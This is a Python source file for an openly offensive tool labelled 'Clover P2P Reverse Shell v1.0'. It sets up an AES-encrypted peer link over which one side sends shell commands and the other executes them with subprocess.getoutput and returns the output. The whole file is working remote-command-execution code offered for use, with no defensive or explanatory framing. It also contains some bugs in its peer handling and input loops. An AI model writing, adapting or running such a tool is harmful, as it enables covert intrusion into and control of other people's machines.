import re
import socket
import sys
import threading
import queue
import os
import subprocess
import secrets
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad


art = """
           ,NÑ╦╓DÑ╗
           ╫^`╙╫"`╢▌
          ╫Ñ  ╗╚╬  ▓
          ╫N╫ ╫ ╫▐▓▓
         ,└╫  ╫╣▀ "▓▓
      ,,,╫ ▓╗  ╜  ▓ ▀",,
     ╬╫╝╫`µ ▓,   ╣▌ ▄▓▓██▄
    ╬╬ ╟▌ ▓Φ╙▓  ▄█╓▓▀`█ `█
    ╫H ,   ▀▓║▓ ▓▄▓^  ,, █⌐
    ╟▌▓▓▓▄  ╙▓█▓,▀   ███,█
    ╓▓`╓▄▓   `▓██▄  ╙█▄▄██
    ▓Ñ╙▀▀  ,▓▀ ███▄  "▀▀'█
    ▓▄ Φ▄ ▄▓▀█▀ █▄██, ▓  █
    `▓▄▄▓▓█ █▌   █▄╙█▄█╓▓█
     `▀█▀╙ ▄█    `█ ,█▀█▀
         ▀█,  ▄█, ▀█╙Γ
          ██▓ █╙█╔██
          █▌╙ █ █╙└█
          ╙█  █▄" ,█
           ▀█▓███▓█╨                Clover P2P Reverse Shell v1.0 by Chokri Hammedi
            `└  `└
"""

print('\033[32m' + art + '\033[')

def is_valid_ipv4_address(address):
    try:
        socket.inet_pton(socket.AF_INET, address)
    except AttributeError:
        try:
            socket.inet_aton(address)
        except socket.error:
            return False
        return address.count('.') == 3
    except socket.error:
        return False
    return True


def is_valid_hostname(hostname):
    if len(hostname) > 255:
        return False
    if hostname[-1] == ".":
        hostname = hostname[:-1]
    allowed = re.compile(r"(?!-)[A-Z\d-]{1,63}(?<!-)$", re.IGNORECASE)
    return all(allowed.match(x) for x in hostname.split("."))


def is_valid_port(port):
    return 0 < port < 65536


def is_valid_hex_key(key):
    if len(key) != 64:
        return False
    return bool(re.match("^[0-9a-fA-F]*$", key))


def is_valid_command(command: str, max_length: int = 150) -> bool:
    if len(command) > max_length:
        return False

    pattern = re.compile(r'^[a-zA-Z0-9\s\-_./\\:]+$')
    return bool(pattern.match(command))


class AESEncryption:
    BLOCK_SIZE = AES.block_size

    def __init__(self, key):
        self.key = key

    def encrypt(self, data):
        iv = secrets.token_bytes(self.BLOCK_SIZE)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        ct = cipher.encrypt(pad(data, self.BLOCK_SIZE))
        return iv + ct

    def decrypt(self, data):
        iv = data[:self.BLOCK_SIZE]
        ct = data[self.BLOCK_SIZE:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(ct), self.BLOCK_SIZE)

class Peer:
    def __init__(self, key):
        self.host = '0.0.0.0'
        self.port = 0
        self.encryption = AESEncryption(key)
        self.peers = []
        self.command_queue = queue.Queue()
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.peer_working_directories = {}

    def validate_key(self, key):
        if len(key) != 32:
            print("[-] Invalid key length. It must be 32 bytes long.")
            return False
        return True

    def start(self):
        mode = input("[1] Listen for incoming connections\n[2] Connect to peer\n\nPlease select a mode: ")

        if mode == '1':
            port = int(input("Enter the local port to listen on: "))
            while not is_valid_port(port):
                print("[!] Invalid port. Please enter a valid port number.")
                port = input("Enter the local port to listen on: ")
            self.port = int(port)
            key_input = input(
                "Enter an encryption key (32 bytes in hexadecimal format) or leave blank to generate a new one: ")
            if not key_input:
                self.key = os.urandom(32)
                print(f"[+] Generated key: {self.key.hex()}")
            else:
                while not is_valid_hex_key(key_input):
                    print("[-] Invalid key. Please enter a valid hexadecimal key (32 bytes).")
                    key_input = input("Enter an encryption key (32 bytes in hexadecimal format): ")
                self.key = bytes.fromhex(key_input)
        elif mode == '2':
            peer_host = input("Enter the peer host to connect to: ")
            while not is_valid_ipv4_address(peer_host):
                print("[!] Invalid IP address. Please enter a valid IPv4 address.")
                peer_host = input("Enter the peer host to connect to: ")
            peer_port = int(input("Enter the peer port to connect to: "))
            while not is_valid_port(peer_port):
                print("[!] Invalid port. Please enter a valid port number.")
                peer_port = input("Enter the peer port to connect to: ")
            key_input = input("Enter the encryption key (32 bytes in hexadecimal format): ")
            while not is_valid_hex_key(key_input):
                print("[-] Invalid key. Please enter a valid hexadecimal key (32 bytes).")
                key_input = input("Enter the encryption key (32 bytes in hexadecimal format): ")
            self.key = bytes.fromhex(key_input)

        else:
            print("[!] Invalid mode selected. Exiting...")
            sys.exit(1)

        self.encryption = AESEncryption(self.key)

        if mode == '1':
            listener_thread = threading.Thread(target=self.listen_for_connections)
            listener_thread.daemon = True
            listener_thread.start()
        elif mode == '2':
            self.connect_to_peer((peer_host, int(peer_port)))

        self.command_prompt()

    def connect_to_peer(self, peer_address):
        connected = False
        while not connected:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5) 
                sock.connect(peer_address)
                print(f"[+] Connected to {peer_address[0]}:{peer_address[1]}")
                self.peers.append((sock, peer_address))
                connected = True

            except ConnectionRefusedError:
                print(f"[!] Connection to {peer_address[0]}:{peer_address[1]} refused.")
            except socket.timeout:
                print(f"[!] Connection to {peer_address[0]}:{peer_address[1]} timed out.")

            if not connected:
                print("Please re-enter the peer host and port to connect to.")
                peer_host = input("Enter the peer host to connect to: ")
                while not is_valid_ipv4_address(peer_host):
                    print("[!] Invalid IP address. Please enter a valid IPv4 address.")
                    peer_host = input("Enter the peer host to connect to: ")
                peer_port = int(input("Enter the peer port to connect to: "))
                while not is_valid_port(peer_port):
                    print("[!] Invalid port. Please enter a valid port number.")
                    peer_port = input("Enter the peer port to connect to: ")
                peer_address = (peer_host, int(peer_port))


    def listen_for_connections(self):
        listener_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener_sock.bind((self.host, self.port))
        listener_sock.listen(5)
        print(f"[+] Listening on port {self.port}")
        while True:
            client_sock, client_address = listener_sock.accept()
            print(f"[+] Received connection from {client_address[0]}:{client_address[1]}")
            self.peers.append((client_address[0], client_address[1]))
            client_handler_thread = threading.Thread(target=self.handle_client_connection, args=(client_sock,))
            client_handler_thread.start()

    def handle_client_connection(self, client_sock):
        try:
            while True:
                encrypted_command = self._recv_data(client_sock)
                if not encrypted_command:
                    break

                command = self.encryption.decrypt(encrypted_command).decode('utf-8')
                if command == 'exit':
                    break
                else:
                    output = subprocess.getoutput(command)
                    encrypted_output = self.encryption.encrypt(output.encode())
                    self._send_data(client_sock, encrypted_output)

        except Exception as e:
            print(f"[!] Error in client connection: {e}")

        finally:
            client_sock.close()

    def connect_to_peers(self, peers):
        for peer in peers:
            if peer != (self.host, self.port):
                try:
                    peer_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    peer_sock.connect(peer)
                    self.peers.append(peer)
                    print(f"[+] Connected to {peer[0]}:{peer[1]}")
                except ConnectionRefusedError:
                    print(f"[!] Connection to {peer[0]}:{peer[1]} refused.")
                finally:
                    peer_sock.close()

    def command_prompt(self):
        while True:
            command = input(">>> ")
            if not command:
                continue
            if command == "peers":
                print("Connected peers:")
                for i, peer in enumerate(self.peers):
                    print(f"{i}: {peer[0]}:{peer[1]}")
            elif command == "exit":
                break
            elif command == "help":
                print("Available commands:\n"
                      "  peers\n"
                      )
            elif command.endswith("-q"):
                if not is_valid_command(command[:-3].strip()):
                    print(
                        "[-] Invalid command. Please enter a command containing only letters, numbers, and allowed special characters (_./\\:-).")
                    continue
                self.command_queue.put(command[:-3].strip())
                print(f"[*] Added command to the queue: {command[:-3].strip()}")
            else:
                if not is_valid_command(command):
                    print(
                        "[-] Invalid command. Please enter a command containing only letters, numbers, and allowed special characters (_./\\:-).")
                    continue
                self.execute_command_on_peers(command)

    def execute_command_on_peers(self, command):
        if not self.peers:
            print("[!] No peers connected.")
            return

        while not self.command_queue.empty():
            queued_command = self.command_queue.get()
            for peer_sock, peer_addr in self.peers:
                self.send_command_to_peer(peer_sock, peer_addr, queued_command)

        for peer_sock, peer_addr in self.peers:
            if command.startswith("cd "):
                new_dir = command[3:].strip()
                current_dir = self.peer_working_directories.get(peer_addr, ".")
                new_abs_dir = os.path.abspath(os.path.join(current_dir, new_dir))
                self.peer_working_directories[peer_addr] = new_abs_dir
                print(f"Changed working directory of {peer_addr[0]}:{peer_addr[1]} to {new_abs_dir}")
            else:
                self.send_command_to_peer(peer_sock, peer_addr, command)

    def send_command_to_peer(self, peer_sock, peer_addr, command):
        working_directory = self.peer_working_directories.get(peer_addr, None)
        if working_directory:
            command_to_execute = f"cd {working_directory} && {command}"
        else:
            command_to_execute = command

        encrypted_command = self.encryption.encrypt(command_to_execute.encode())
        self._send_data(peer_sock, encrypted_command)

        encrypted_response = self._recv_data(peer_sock)
        response = self.encryption.decrypt(encrypted_response)
        print(f"{peer_addr[0]}:{peer_addr[1]} => {response.decode('utf-8')}")

    def _send_data(self, sock, data):
        data_length = len(data)
        sock.sendall(data_length.to_bytes(4, 'big'))
        sock.sendall(data)

    def _recv_data(self, sock):
        data_length = int.from_bytes(sock.recv(4), 'big')
        data = bytearray()
        while len(data) < data_length:
            chunk = sock.recv(min(data_length - len(data), 4096))
            if not chunk:
                break
            data.extend(chunk)
        return bytes(data)

def main():
    peer = Peer(None)
    peer.start()

if __name__ == '__main__':
    main()
